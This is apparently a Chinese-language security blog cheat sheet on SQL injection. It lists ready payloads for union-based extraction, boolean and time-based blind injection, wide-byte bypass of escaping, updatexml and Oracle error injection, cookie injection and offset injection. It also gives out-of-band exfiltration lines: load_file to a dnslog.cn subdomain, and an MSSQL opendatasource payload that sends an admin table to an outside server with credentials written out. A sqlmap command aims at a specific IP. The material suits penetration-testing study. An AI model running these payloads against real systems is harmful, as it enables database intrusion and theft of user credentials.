---
title: SQL注入
toc: false
date: 2021-03-24 15:53:00
description: SQL注入
tags: Web安全
categories: Web安全
---

## 0x01 SQL注入原理

用户输入的数据被当作代码执行

## 0x02 基本手工注入流程

### 判断注入点

```
数字型：id=2-1、and 1=1、and 1=2、and -1=-2、and 1>0、or 1=1 ......
字符型：'、')、'))、)、"、")、"))
注释符：-- qwe、/**/、#
```

### 获取字段数

```
order by n
```

### 查看回显点

```
and 1=2 union select 1,2,3,......,n
```

### 查看数据库名称(假设n是回显点)

```
and 1=2 union select 1,2,3,......,database()
```

### 查看表名

```
and 1=2 union select 1,2,3,......,table_name from information_schema.tables where table_schema = database() limit 0,1    // limit 0,1 0是从哪开始,1是显示几个
```

### 查看字段名

```
union select 1,2,3,......,column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1
```

### 查看字段内容

```
union select 1,2,3,......,字段名 from 表名 limit 0,1
```

## **0x03 盲注(布尔盲注、延时盲注)**

在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。

当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试

### 函数

1. length()

返回字符串的长度

2. substr()

截取字符串。语法：substr(str,pos,len)

3. ascii()

返回字符的ascii码【将字符变为数字】

4. sleep()

将程序挂起一段时间n，n为n秒

5. if(expr1,expr2,expr3)

判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句

### 布尔盲注

1. 猜解当前数据库名称长度

```
and (length(database()))>9
```

2. 利用ASCII码猜解当前数据库名称

```
and (ascii(substr(database(),1,1)))=115   // 返回正常，说明数据库名称第一位是s
and (ascii(substr(database(),2,1)))=101    // 返回正常，说明数据库名称第二位是e
```

3. 猜表名

```
and (ascii((substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101    // 返回正常，说明数据表名的第一个第一位是e
```

4. 猜字段名

```
and (ascii(substr((select column_name from information.columns where table_name='表名' limit 0,1),1,1)))=102    // 返回正常，说明表中的列名称第一位是f
```

5. 猜内容

```
and (ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=122    // 返回正常，说明表中列第一位是z
```

### 延时盲注

与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确

```
and if((length(database()))>n,sleep(10),1)
```

## **0x04 宽字节注入** 

### PHP的防御函数

magic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数

这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。

单引号、双引号、反斜线与NULL等字符都会被加上反斜线

### 遇到了魔术引号

1. 寻找不需要闭合的注入点
2. 使用宽字节注入

宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入

发现输入'注释时有\将之转义，这时在前面加一个%df可以将\合起来变成一个汉字，从而达到注释的效果。

通过16进制，子查询或者函数来替换有单引号的地方

1. GET注入中在闭合符号前加上%df
2. POST注入中在闭合符号前加上汉字
3. 修改brupsuite的hex中对应数的16进制值

## **0x05 报错注入(HEAD注入)**

### **TIPS：只有知道账户密码的时候可用**

### PHP全局变量——超全局变量

PHP中的许多预定义变量都是"超全局的"，这意味着它们在一个脚本的全部脚本域中都可以使用。

超全局变量：

- $_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了
- $_POST(获取POST传参)
- $_GET(获取GET的传参)
- $_COOKIE(获取COOKIE的值)
- $_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大

常用的：

- $_SERVER['HTTP_REFERER'] 获取Referer请求头数据
- $_SERVER["HTTP_USER_AGENT"] 获取用户相关信息，包括用户浏览器、操作系统等信息
- $_SERVER["REMOTE_ADDR"] 浏览网页的用户IP

### 函数

updatexml()更新xml文档的函数

语法：updatexml(目标xml内容，xml文档路径，更新的内容)

```
updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema = database() limit 0,1),0x7e),1)
updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1),0x7e),1)
updatexml(1,concat(0x7e,(SELECT 字段名 from 表名 limit 1,1),0x7e),1)
```

### PS

1. 0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错
2. 有时可以在请求头中加上X-Forwarded-For: 进行注入

## 0x06 Cookie注入

### and等字符被拦截的情况下，asp、aspx、php<=5.4.45可用

开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码

在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。

### 设置Cookie，需要URL编码

1. 按F12，在浏览器中修改Cookie
2. 使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样
3. 通过Js，document.cookie="id="+escape("171 order by 1")

Access查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：

- 查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法
- 强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名

之后要查出表内内容有两个办法：

- 强猜，猜测表内有什么字段
- 偏移注入

### sqlmap跑Cookie注入

```
sqlmap.py -u "http://59.63.200.79:8004/shownews.asp" --cookie "id=171" --level 2
```

## 0x07 偏移注入

### 使用场景

在SQL注入的时候会碰到一些无法查询列名的情况，比如

- 系统自带数据库的权限不够而无法访问系统自带库。
- 当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。

表名.*：*在数据库中代表一切；.代表向下

### 使用步骤

```
union select 1,2,3,admin.* from admin    // 放在不同的回显点显示不同的字段的内容，回显点包含在admin.*内
union select 1,2,admin.*,10 from admin
```

## 0x08 DNS注入

### 使用场景

无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。

核心：将盲注转化为显错注入

MySQL必须打开`secure_file_priv= ` 

### 函数解析

load_file()读取文件

```
select load_file('//error.1806dl.dnslog.cn/bc');
select load_file(concat('//',(select database()),'.1806dl.dnslog.cn/bc'));
```

dnslog.cn   // 网站

## **0x9 反弹注入**

### 使用场景

页面没东西显示的盲注

明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。

反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。

### 显错注入

1. 猜字段
2. 联合查询，要写union all select
3. 输出点要用null填充
4. 注释只有--+
5. sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U --+
6. syscolumns字段 union all select id,name,null from syscolumns where id=id --+
7. 查询信息 union all select id,passwd,token from admin --+

### 反弹注入

```
';insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz').xyzxyz.dbo.test select * from admin --
```

## 0x10 报错注入

### Orcale可用

dual是一个虚表，直接查询他只显示一个X，列名为dummy

dual实际上是为了满足查询语句的结构产生的

查询用户名：select user from dual

调用系统函数：(获得随机值：select dbms_random.random from dual)

做加减法： select 9+1 from dual

查询出所有的表：union all select * from all_tables

查询出当前用户的表：select * from user_tables

查询出所有的字段：select * from all_tab_columns

查询出当前用户的字段：select * from user_tab_columns

查版本：select * from v$version

rownum=1 (限制查询返回的总行数为一条)

Oracle中<>和!=都是不等于

to_nchar()转换进制

### 报错注入

不用管有没有输出点

不用管数据类型

不用管字段数

```
ctxsys.drithsx.sn(user,(select banner from v$version where rownum = 1))
```

查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容

```
and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name<>'NEWS'))
```

